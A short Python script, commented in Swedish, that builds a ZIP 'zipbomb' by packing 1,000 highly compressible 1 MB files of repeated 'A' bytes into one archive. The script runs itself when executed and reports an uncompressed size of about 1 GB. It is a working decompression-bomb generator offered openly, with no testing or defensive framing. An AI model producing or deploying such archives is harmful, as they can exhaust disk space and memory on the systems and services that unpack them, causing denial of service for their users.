import zipfile
import os

def create_zipbomb(output_filename="zipbomb.zip", num_files=1000, file_size_mb=1):
    """
    Skapar en zipbomb genom att skapa många filer med samma innehåll och lägga dem i en ZIP-fil.
    
    :param output_filename: Namnet på den utgående ZIP-filen.
    :param num_files: Antal filer att inkludera i ZIP-filen.
    :param file_size_mb: Storlek på varje fil i megabyte.
    """
    # Skapa ett stort block av data för att fylla filerna
    # Här använder vi 'A' upprepade gånger för att simulera filinnehåll
    content = b'A' * (file_size_mb * 1024 * 1024)

    with zipfile.ZipFile(output_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for i in range(num_files):
            # Skapa ett unikt filnamn för varje fil
            filename = f"file_{i}.txt"
            
            # Lägg till filen i ZIP-arkivet med det stora innehållet
            zipf.writestr(filename, content)

    print(f"Zipbomb '{output_filename}' skapad!")
    print(f"Antal filer i ZIP: {num_files}")
    print(f"Storlek per fil: {file_size_mb} MB")
    print(f"Total storlek vid unpackning: ~{num_files * file_size_mb} MB")

# Kör funktionen
create_zipbomb()
